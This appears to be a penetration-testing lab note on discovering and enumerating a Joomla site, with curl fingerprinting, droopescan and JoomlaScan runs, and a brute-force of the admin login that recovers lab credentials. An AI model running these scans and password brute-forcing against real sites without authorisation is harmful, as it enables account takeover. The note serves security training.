# Joomla - Discovery & Enumeration

Joomla is a free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more.

It is written in PHP and uses MySQL in the backend.

## Discovery/Footprinting

curl -s http://dev.inlanefreight.local/ | grep Joomla

	<meta name="generator" content="Joomla! - Open Source Content Management" />


Check robots.txt :

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

curl -s http://dev.inlanefreight.local/README.txt | head -n 5

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>

## Enumeration

https://github.com/droope/droopescan
sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/

--> not much information aside the version

we can also try https://github.com/drego85/JoomlaScan (requires python 2.7)

sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4
python2.7 joomlascan.py -u http://dev.inlanefreight.local

### Bruteforce

The default administrator account on Joomla installs is admin
But no default password

https://github.com/ajnik/joomla-bruteforce

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin



## LAB

IP=10.129.75.135
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local" | sudo tee -a /etc/hosts

git clone https://github.com/drego85/JoomlaScan
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4
cd JoomlaScan/
python2.7 joomlascan.py -u http://app.inlanefreight.local

Traceback (most recent call last):
  File "joomlascan.py", line 4, in <module>
    import requests
ImportError: No module named requests

sudo pip3 install droopescan
droopescan scan joomla --url http://app.inlanefreight.local/

[+] Possible version(s):                                                        
    3.10.0-alpha1

git clone https://github.com/ajnik/joomla-bruteforce
cd joomla-bruteforce/
sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:turnkey